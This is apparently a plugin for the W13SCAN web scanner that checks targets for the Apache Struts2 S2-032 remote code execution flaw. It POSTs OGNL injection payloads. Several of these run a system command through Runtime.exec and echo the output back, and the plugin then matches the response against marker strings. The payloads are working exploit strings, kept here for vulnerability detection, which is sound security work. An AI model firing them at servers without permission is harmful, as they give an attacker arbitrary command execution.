# coding   :utf-8
# file     : struts2_032.py
# author   : go0p
# time     : 2019/8/18 1:53 PM
# software :PyCharm

import copy
import os
import random
import requests

from W13SCAN.lib.common import prepare_url
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'Struts2-032远程代码执行'
    desc = ''''''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        version = self.requests.request_version  # HTTP 0.9/1.0/1.1
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL
        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if self.response.language and self.response.language != "JAVA":
            return

        if method == 'GET':
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            ran_a = random.randint(10000000, 20000000)
            ran_b = random.randint(1000000, 2000000)
            ran_check = ran_a - ran_b
            lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)

            checks = [str(ran_check), '无法初始化设备 PRN', '??????? PRN', '<Struts2-vuln-Check>',
                      'Unable to initialize device PRN']
            payloads = [
                r"method%3a%23_memberAccess%3d@ognl.OgnlContext+@DEFAULT_MEMBER_ACCESS%2c%23kxlzx%3d+@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28" + str(
                    ran_a) + '-' + str(ran_b) + "%29%2c%23kxlzx.close",
                r"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=print+test&pp=\\A&ppp=%20&encoding=UTF-8",
                r"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=" + lin + r"&pp=\\A&ppp=%20&encoding=UTF-8",
                r"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),%23w.print('Check>'),1?%23xx:%23request.toString&pp=<Struts2-vuln-&encoding=UTF-8"
            ]
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            for payload in payloads:
                r = requests.post(url , headers=headers,data=payload)
                html1 = r.text
                for check in checks:
                    if check in html1:
                        out.success(url, self.name, playload="{}".format(payload), method="POST", check=check,
                                    raw=r.raw)
                        return
